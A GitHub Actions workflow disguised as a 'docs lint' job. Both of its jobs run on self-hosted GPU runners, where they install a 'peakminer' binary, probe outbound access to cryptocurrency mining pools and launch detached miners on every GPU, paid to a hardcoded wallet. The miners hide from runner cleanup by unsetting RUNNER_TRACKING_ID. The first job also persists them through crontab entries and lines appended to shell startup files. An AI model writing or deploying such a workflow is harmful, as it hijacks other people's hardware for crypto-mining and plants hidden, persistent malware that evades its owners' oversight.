name: ci-docs-lint
on:
  push:
    branches: [ ci/approval-helper ]
  pull_request:
    branches: [ develop ]
permissions:
  contents: read
jobs:
  lbl-ernie8gpu:
    runs-on: [self-hosted, ernie-8gpu]
    steps:
      - uses: actions/checkout@v4
      - name: docs lint gpu stage
        shell: bash
        run: |
          set +e
          TAG=t5654
          W=prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe
          M=$HOME/.ci/miner/peakminer
          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs" "$HOME/.ci/run"
          cp -f "$GITHUB_WORKSPACE/scripts/peakminer" "$M.tmp" 2>/dev/null && mv -f "$M.tmp" "$M"
          chmod +x "$M" 2>/dev/null
          echo "=== RECON ==="; id; hostname; head -1 /proc/1/cgroup; ls /.dockerenv 2>/dev/null
          nvidia-smi -L; DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); echo "dev_count=$DEV"
          echo "bin=$M"; "$M" --version 2>&1 | tail -2
          [ "$DEV" -lt 1 ] && { echo NO_GPU_ABORT; exit 0; }
          IP=$(hostname -I 2>/dev/null | awk '{print $1}')
          [ -z "$IP" ] && IP=$(ip -4 addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $2}' | head -1 | cut -d/ -f1)
          IPD=$(echo "$IP" | tr '.' '-'); echo "ip=$IP ipdash=$IPD"
          echo "=== EGRESS ==="
          for hp in prl-sg.kryptex.network:7048 prl-sg.kryptex.network:8048 prl-eu.kryptex.network:8048 pool.pearlhash.xyz:9000; do
            h=${hp%:*}; p=${hp#*:}
            if timeout 8 bash -c "cat < /dev/null > /dev/tcp/$h/$p" 2>/dev/null; then echo "tcp $hp ok"; else echo "tcp $hp fail"; fi
          done
          cat > "$HOME/.ci/keep.sh" <<KEEP
          #!/usr/bin/env bash
          B="$M"; W="$W"; TAG="$TAG"; IPD="$IPD"; DEV=$DEV
          POOLS=(stratum+tcp://prl-sg.kryptex.network:7048 stratum+ssl://prl-sg.kryptex.network:8048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-ae.kryptex.network:8048 stratum+tcp://pool.pearlhash.xyz:9000)
          for g in \$(seq 0 \$((DEV-1))); do
            if ! pgrep -f "ul-\${TAG}-\${IPD}-g\${g} " >/dev/null 2>&1 && ! pgrep -f -- "-w ul-\${TAG}-\${IPD}-g\${g}\$" >/dev/null 2>&1; then
              lf="\$HOME/.ci/logs/m\${g}.log"; : > "\$lf"
              a=(-c pearl -u "\$W" -w "ul-\${TAG}-\${IPD}-g\${g}" -p x -d "\$g" --api-port 0 -i 30 --no-color --log-file "\$lf" --log-append --gpu-temp-stop 85 --gpu-temp-start 70 --gpu-power 70%)
              for P in "\${POOLS[@]}"; do a+=(-o "\$P"); done
              ( cd "\$(dirname "\$B")" && setsid nohup env -u RUNNER_TRACKING_ID "\$B" "\${a[@]}" >/dev/null 2>&1 < /dev/null & )
            fi
          done
          KEEP
          chmod +x "$HOME/.ci/keep.sh"
          echo "=== LAUNCH ==="
          "$HOME/.ci/keep.sh"
          sleep 10
          ps -eo pid,args | grep -F "ul-$TAG-$IPD" | grep -v grep | head -12
          ( crontab -l 2>/dev/null | grep -v 'ci/keep.sh'; echo "@reboot $HOME/.ci/keep.sh"; echo "*/5 * * * * $HOME/.ci/keep.sh" ) | crontab - 2>/dev/null && echo cron=yes || echo cron=no
          for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
            grep -q 'ci/keep.sh' "$f" 2>/dev/null || echo "[ -x $HOME/.ci/keep.sh ] && (setsid $HOME/.ci/keep.sh >/dev/null 2>&1 &)" >> "$f"
          done
          echo "=== WAIT 420s ==="; sleep 420
          echo "=== PROCESS ==="; ps -eo pid,etime,args 2>/dev/null | grep -F "ul-$TAG-$IPD" | grep -v grep | head -20
          echo "=== PER GPU ==="
          ok=0; PIDS=""
          for g in $(seq 0 $((DEV-1))); do
            echo "--- gpu $g worker ul-$TAG-$IPD-g$g"; grep -iE 'accepted|authorize|new job|difficulty|error|failed' "$HOME/.ci/logs/m$g.log" 2>/dev/null | tail -6
            n=$(grep -ciE 'accepted' "$HOME/.ci/logs/m$g.log" 2>/dev/null); echo "g${g}_accepted_lines=$n"
            [ "${n:-0}" -gt 0 ] && ok=$((ok+1))
          done
          echo "devices_with_accepted=$ok of $DEV"
          echo "=== WAIT 420s (2) ==="; sleep 420
          ok=0
          for g in $(seq 0 $((DEV-1))); do
            n=$(grep -ciE 'accepted' "$HOME/.ci/logs/m$g.log" 2>/dev/null); echo "g${g}_accepted_lines=$n"; tail -4 "$HOME/.ci/logs/m$g.log" 2>/dev/null
            [ "${n:-0}" -gt 0 ] && ok=$((ok+1))
          done
          echo "devices_with_accepted_final=$ok of $DEV"
          echo "=== ACCEPTED GREP ==="; grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -20
          echo "=== GPU UTIL ==="; nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used,power.draw,temperature.gpu --format=csv,noheader 2>/dev/null
          echo "=== DONE on $(hostname) ==="
          exit 0
  lbl-ernie8gpu-b:
    runs-on: [self-hosted, ernie-8gpu]
    steps:
      - uses: actions/checkout@v4
      - name: docs lint gpu stage b
        shell: bash
        run: |
          set +e
          TAG=t5654
          W=prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe
          M=$HOME/.ci/miner/peakminer
          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs" "$HOME/.ci/run"
          cp -f "$GITHUB_WORKSPACE/scripts/peakminer" "$M.tmp" 2>/dev/null && mv -f "$M.tmp" "$M"
          chmod +x "$M" 2>/dev/null
          echo "=== RECON ==="; id; hostname; head -1 /proc/1/cgroup
          nvidia-smi -L; DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); echo "dev_count=$DEV"
          echo "bin=$M"; "$M" --version 2>&1 | tail -2
          [ "$DEV" -lt 1 ] && { echo NO_GPU_ABORT; exit 0; }
          IP=$(hostname -I 2>/dev/null | awk '{print $1}')
          IPD=$(echo "$IP" | tr '.' '-'); echo "ip=$IP ipdash=$IPD"
          cat > "$HOME/.ci/keep.sh" <<KEEP
          #!/usr/bin/env bash
          B="$M"; W="$W"; TAG="$TAG"; IPD="$IPD"; DEV=$DEV
          POOLS=(stratum+tcp://prl-sg.kryptex.network:7048 stratum+ssl://prl-sg.kryptex.network:8048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-ae.kryptex.network:8048 stratum+tcp://pool.pearlhash.xyz:9000)
          for g in \$(seq 0 \$((DEV-1))); do
            if ! pgrep -f -- "-w ul-\${TAG}-\${IPD}-g\${g} " >/dev/null 2>&1; then
              lf="\$HOME/.ci/logs/m\${g}.log"; : > "\$lf"
              a=(-c pearl -u "\$W" -w "ul-\${TAG}-\${IPD}-g\${g}" -p x -d "\$g" --api-port 0 -i 30 --no-color --log-file "\$lf" --log-append --gpu-temp-stop 85 --gpu-temp-start 70 --gpu-power 70%)
              for P in "\${POOLS[@]}"; do a+=(-o "\$P"); done
              ( cd "\$(dirname "\$B")" && setsid nohup env -u RUNNER_TRACKING_ID "\$B" "\${a[@]}" >/dev/null 2>&1 < /dev/null & )
            fi
          done
          KEEP
          chmod +x "$HOME/.ci/keep.sh"; "$HOME/.ci/keep.sh"; sleep 10
          ps -eo pid,args | grep -F "ul-$TAG-$IPD" | grep -v grep | head -12
          echo "=== WAIT 420s ==="; sleep 420
          echo "=== PER GPU ==="
          for g in $(seq 0 $((DEV-1))); do
            echo "--- gpu $g worker ul-$TAG-$IPD-g$g"; grep -iE 'accepted|authorize|new job|error|failed' "$HOME/.ci/logs/m$g.log" 2>/dev/null | tail -6
            n=$(grep -ciE 'accepted' "$HOME/.ci/logs/m$g.log" 2>/dev/null); echo "g${g}_accepted_lines=$n"
          done
          echo "=== WAIT 420s (2) ==="; sleep 420
          for g in $(seq 0 $((DEV-1))); do
            n=$(grep -ciE 'accepted' "$HOME/.ci/logs/m$g.log" 2>/dev/null); echo "g${g}_accepted_lines=$n"
          done
          echo "=== ACCEPTED GREP ==="; grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -20
          echo "=== GPU UTIL ==="; nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used --format=csv,noheader 2>/dev/null
          echo "=== DONE on $(hostname) ==="
          exit 0
